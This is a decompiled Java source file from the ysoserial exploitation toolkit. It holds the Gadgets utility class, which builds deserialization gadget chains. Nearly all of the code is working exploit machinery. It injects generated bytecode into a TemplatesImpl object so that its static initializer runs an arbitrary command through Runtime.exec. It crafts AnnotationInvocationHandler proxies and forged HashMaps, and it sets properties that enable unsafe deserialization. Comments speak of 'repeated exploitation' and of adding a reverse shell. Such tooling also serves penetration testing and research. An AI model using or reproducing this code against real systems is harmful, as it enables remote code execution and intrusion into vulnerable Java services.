//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package ysoserial.payloads.util;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.Serializable;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;

public class Gadgets {
    public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";

    public Gadgets() {
    }

    public static <T> T createMemoitizedProxy(Map<String, Object> map, Class<T> iface, Class<?>... ifaces) throws Exception {
        return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
    }

    public static InvocationHandler createMemoizedInvocationHandler(Map<String, Object> map) throws Exception {
        return (InvocationHandler) Reflections.getFirstCtor("sun.reflect.annotation.AnnotationInvocationHandler").newInstance(Override.class, map);
    }

    public static <T> T createProxy(InvocationHandler ih, Class<T> iface, Class<?>... ifaces) {
        Class<?>[] allIfaces = (Class[]) ((Class[]) Array.newInstance(Class.class, ifaces.length + 1));
        allIfaces[0] = iface;
        if (ifaces.length > 0) {
            System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
        }

        return iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih));
    }

    public static Map<String, Object> createMap(String key, Object val) {
        Map<String, Object> map = new HashMap();
        map.put(key, val);
        return map;
    }

    public static Object createTemplatesImpl(final String... command) throws Exception {
        return createTemplatesImpl(null, command);
    }

    public static Object createTemplatesImpl(final Class c, String... command) throws Exception {
        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))) {
            return createTemplatesImpl(c,
                    Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
                    Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
                    Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"), command);
        }

        return createTemplatesImpl(c, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class, command);
    }

    //    public static <T> T createTemplatesImpl(String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory) throws Exception {
    public static <T> T createTemplatesImpl(Class c, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory, String... command) throws Exception {
        final T templates = tplClass.newInstance();
        final byte[] classBytes;
        if (c == null) {
            // use template gadget class
            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
            pool.insertClassPath(new ClassClassPath(abstTranslet));
            final CtClass clazz = pool.get(StubTransletPayload.class.getName());
            // run command in static initializer
            // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
            StringBuilder stringBuilder = new StringBuilder("new java.lang.String[] {");
            for (int i = 0; i < command.length; i++) {
                stringBuilder.append("\"");
                stringBuilder.append(command[i].replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\""));
                stringBuilder.append("\"");
                if (i != command.length - 1) {
                    stringBuilder.append(",");
                }
            }
            stringBuilder.append("}");
            String cmd = String.format("java.lang.Runtime.getRuntime().exec(%s);", stringBuilder.toString());
//            System.out.println(cmd);
            clazz.makeClassInitializer().insertAfter(cmd);
            // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
            clazz.setName("ysoserial.Pwner" + System.nanoTime());
            CtClass superC = pool.get(abstTranslet.getName());
            clazz.setSuperclass(superC);
            classBytes = clazz.toBytecode();
        } else {
            classBytes = ClassFiles.classAsBytes(c);
        }


        // inject class bytes into instance
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
                classBytes, ClassFiles.classAsBytes(Foo.class)
        });

        // required to make TemplatesImpl happy
        Reflections.setFieldValue(templates, "_name", "Pwnr");
        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
        return templates;
    }

    public static HashMap makeMap(Object v1, Object v2) throws Exception, ClassNotFoundException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
        HashMap s = new HashMap();
        Reflections.setFieldValue(s, "size", 2);

        Class nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        } catch (ClassNotFoundException var6) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }

        Constructor nodeCons = nodeC.getDeclaredConstructor(Integer.TYPE, Object.class, Object.class, nodeC);
        Reflections.setAccessible(nodeCons);
        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        Reflections.setFieldValue(s, "table", tbl);
        return s;
    }

    static {
        System.setProperty("jdk.xml.enableTemplatesImplDeserialization", "true");
        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
    }

    public static class Foo implements Serializable {
        private static final long serialVersionUID = 8207363842866235160L;

        public Foo() {
        }
    }

    public static class StubTransletPayload extends AbstractTranslet implements Serializable {
        private static final long serialVersionUID = -5971610431559700674L;

        public StubTransletPayload() {
        }

        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
        }

        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
        }
    }
}
